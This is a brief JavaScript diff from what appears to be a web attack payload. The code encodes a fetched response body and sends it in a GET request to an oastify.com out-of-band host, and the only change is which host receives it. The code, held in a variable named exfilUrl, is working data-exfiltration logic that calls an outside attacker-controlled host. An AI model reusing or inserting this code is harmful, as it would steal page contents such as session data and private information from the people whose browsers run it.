@@ -8,7 +8,7 @@ if (xhr.status === 200) { // Check if the request was successful
     // Ensure proper encoding of the response
     try {
         var encodedResponse = encodeURIComponent(btoa(unescape(encodeURIComponent(responseText))));
-        var exfilUrl = "https://pe72mwfoexb0vbncnd77uk380z6quim6b.oastify.com/?r=" + encodedResponse;
+        var exfilUrl = "https://dzgq7k0czlwogz8081svf8owlnref68ux.oastify.com/?r=" + encodedResponse;
         var exfil = new XMLHttpRequest();
         exfil.open("GET", exfilUrl, false);
         exfil.send();
